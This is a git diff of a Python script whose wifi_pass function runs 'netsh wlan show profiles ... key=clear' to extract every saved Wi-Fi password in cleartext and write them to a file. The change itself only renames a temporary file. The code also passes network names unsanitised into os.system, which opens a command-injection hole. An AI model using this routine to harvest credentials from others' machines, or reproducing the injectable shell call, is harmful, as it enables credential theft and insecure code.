@@ -56,8 +56,8 @@ def wifi_pass1():
 #WIFI PASSWORD
 def wifi_pass():
     wifipass = open('wifipass.txt','w')
-    os.system('netsh wlan show profiles >> temp.txt')
-    data = open('temp.txt','r').read().replace('''
+    os.system('netsh wlan show profiles >> wifi_temp.txt')
+    data = open('wifi_temp.txt','r').read().replace('''
 Profiles on interface WiFi:
 
 Group policy profiles (read only)
@@ -68,13 +68,13 @@ User profiles
 -------------
  ''',' ').replace("\n",'')
     profiles = data.split('    All User Profile     : ')
-    os.remove('temp.txt')
+    os.remove('wifi_temp.txt')
     for i in profiles:
-        os.system('netsh wlan show profiles '+i+' key=clear | findstr Key >> temp.txt')
-        results = open('temp.txt','r').read().replace('''Key Content            : ''','##').replace('\n','').replace('    ','').split('##')
+        os.system('netsh wlan show profiles '+i+' key=clear | findstr Key >> wifi_temp.txt')
+        results = open('wifi_temp.txt','r').read().replace('''Key Content            : ''','##').replace('\n','').replace('    ','').split('##')
         wifipass.write("{:<30}|  {:<}".format(i, str(results[len(results)-1])))
         wifipass.write("\n")
-    os.remove('temp.txt')
+    os.remove('wifi_temp.txt')
 
 
 
